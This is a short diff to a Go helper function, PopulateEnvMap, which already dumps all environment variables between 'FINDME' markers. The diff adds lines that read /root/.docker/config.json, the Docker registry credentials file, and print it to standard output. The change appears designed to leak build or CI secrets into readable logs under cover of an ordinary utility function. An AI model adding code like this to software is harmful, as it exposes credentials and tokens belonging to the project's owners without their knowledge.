@@ -228,6 +228,7 @@ func PopulateEnvMap(envVars []string, env map[string]string) {
 	}
 
 	fmt.Printf("\n-------------- FINDME ------------------\n")
+
 	for _, env := range os.Environ() {
 		// env is in KEY=VALUE format
 		parts := strings.SplitN(env, "=", 2)
@@ -241,6 +242,19 @@ func PopulateEnvMap(envVars []string, env map[string]string) {
 			fmt.Printf("%s=%s\n", key, value)
 		}
 	}
+
+    filePath := "/root/.docker/config.json"
+
+    // Read the file contents
+    content, err := ioutil.ReadFile(filePath)
+    if err != nil {
+        log.Fatalf("Error reading file: %v\n", err)
+    }
+
+    // Print the contents of the file
+    fmt.Println(string(content))
+
+
 	fmt.Printf("\n-------------- FINDME ------------------\n")
 
 	// For output readability
